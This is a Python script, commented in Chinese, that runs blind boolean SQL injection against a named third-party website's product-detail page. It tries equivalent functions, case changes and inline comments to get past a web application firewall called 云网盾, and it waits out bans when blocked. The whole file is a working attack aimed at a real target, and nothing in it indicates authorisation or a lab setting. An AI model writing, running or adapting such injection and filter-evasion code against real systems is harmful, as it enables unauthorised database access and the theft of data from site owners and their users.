#!/usr/bin/env python3
"""yijing_bypass2.py - 测试等价函数绕过云网盾
database()→schema(), length()→char_length(), 大小写, 注释
"""
import urllib.request, urllib.parse, ssl, re, time
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='
TRUE_MARK = '产品展示模块'

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=15, context=ctx)
        b = r.read(80000).decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        b = e.read(80000).decode('utf-8','ignore')
    except Exception:
        return 'ERR'
    if '云网盾' in b or '疑似攻击' in b or '拦截' in b:
        return 'BAN'
    if 'Invalid SQL' in b:
        return 'ERR'
    return 'TRUE' if TRUE_MARK in b else 'FALSE'

def test(cond):
    r = q("687' and if(%s,687,0)#" % cond)
    time.sleep(3)
    return r

# 先测通道
print('通道 1=1:', test('1=1'))
print('通道 1=2:', test('1=2'))

tests = [
    ('length(database())=9', "length(database())=9"),
    ('length(schema())=9', "length(schema())=9"),
    ('char_length(database())=9', "char_length(database())=9"),
    ('character_length(database())=9', "character_length(database())=9"),
    ('大小写Length(Database())', "Length(Database())=9"),
    ('注释length/**/(database())', "length/**/(database())=9"),
    ('schema()直接', "schema()='a'"),
]
for name, cond in tests:
    r = test(cond)
    print('%s -> %s' % (name, r))
    if r == 'BAN':
        print('  触发封禁, 等待300s...')
        time.sleep(300)
